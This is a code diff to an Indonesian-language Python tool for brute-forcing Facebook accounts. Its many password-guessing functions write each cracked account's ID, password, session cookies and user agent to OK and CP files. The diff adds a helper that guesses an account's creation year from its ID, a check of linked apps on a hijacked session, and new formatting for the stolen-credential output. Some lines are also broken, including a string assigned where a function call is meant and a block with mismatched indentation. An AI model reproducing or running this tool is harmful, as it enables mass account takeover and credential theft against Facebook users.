@@ -240,6 +240,37 @@ def info_user():
 
     except Exception as e:
         print(f"Error: {e}")
+#--------------------[ BAGIAN-TAHUN ]--------------#
+def tahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
+		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
+		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
+		elif fx[:5] in ['10009']           :tahunz = '2023'
+		elif fx[:5] in ['61550']           :tahunz = '2023'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008-2009'
+	elif len(fx)==8:
+		tahunz = '2007-2008'
+	elif len(fx)==7:
+		tahunz = '2006-2007'
+	else:tahunz=''
+	return tahunz
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
     try:
@@ -250,17 +281,17 @@ def login():
 	    print('[×]{M} Cookies Kadaluarsa ')
 	    time.sleep(5)
 	    login_lagi334()
-	    try:
-		   info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
-		   sy2 = info_datafb["name"]
-		   sy3 = info_datafb["id"]
-		   login(sy2,sy3)
-	    except requests.exceptions.ConnectionError:
-		   exit(f"\n{P} [:]{M} Tidak ada koneksi{P}")
-	    except KeyError:
-		   try:os.remove(".cok.txt");os.remove(".token.txt")
-		   except:pass
-		   login_lagi334()
+	try:
+		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
+	    sy2 = info_datafb["name"]
+		sy3 = info_datafb["id"]
+		login(sy2,sy3)
+	except requests.exceptions.ConnectionError:
+		exit(f"\n{P} [:]{M} Tidak ada koneksi{P}")
+	except KeyError:
+		try:os.remove(".cok.txt");os.remove(".token.txt")
+		except:pass
+		login_lagi334()
 
 def login_lagi334():
 	try:
@@ -684,7 +715,7 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print(f'[[blue]•] OK : {h}%s '%(ok))
-	print(f'[[blue]•]CP : {k}%s '%(cp))
+	print(f'[[blue]•] CP : {k}%s '%(cp))
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
@@ -710,7 +741,7 @@ def validate1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -719,7 +750,7 @@ def validate1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyzz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -732,7 +763,7 @@ def validate1(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> USER AGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyzz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -742,7 +773,7 @@ def validate1(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -779,7 +810,7 @@ def validate2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -788,7 +819,7 @@ def validate2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -801,7 +832,7 @@ def validate2(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -811,7 +842,7 @@ def validate2(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -848,7 +879,7 @@ def validate3(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -857,7 +888,7 @@ def validate3(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -870,7 +901,7 @@ def validate3(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -880,7 +911,7 @@ def validate3(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='ARIP-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -937,7 +968,7 @@ def reguler1(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -946,7 +977,7 @@ def reguler1(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -959,7 +990,7 @@ def reguler1(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -969,7 +1000,7 @@ def reguler1(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1023,7 +1054,7 @@ def reguler2(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1032,7 +1063,7 @@ def reguler2(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1045,7 +1076,7 @@ def reguler2(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1055,7 +1086,7 @@ def reguler2(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1111,7 +1142,7 @@ def reguler3(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1120,7 +1151,7 @@ def reguler3(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1133,7 +1164,7 @@ def reguler3(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1143,7 +1174,7 @@ def reguler3(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1200,7 +1231,7 @@ def kontol(idf,pwv):
 				if 'no' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1209,7 +1240,7 @@ def kontol(idf,pwv):
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
-					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
+					statuscp = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──> UGENT : {U}{ua}{N} '
 					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1222,7 +1253,7 @@ def kontol(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1232,7 +1263,7 @@ def kontol(idf,pwv):
 					coki=po.Kues.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
 					print('\n')
-					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
+					statusok = f'├──> ID  : {b}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {H}{kuki}{N}\n└──> UGENT : {U}{ua}{N}\n└──> Aplikasi Terkait : {b}{cka}{N} '
 					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -1297,6 +1328,7 @@ def crack(idf,pwv):
 			time.sleep(31)
 	loop+=1
 #----------------------[ CEK-APLIKASI ]---------------------#
+cka = 'cek_apk(session,cookie)'
 def cek_apk(session,cookie):
 	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
 	sop = BeautifulSoup(w,"html.parser")
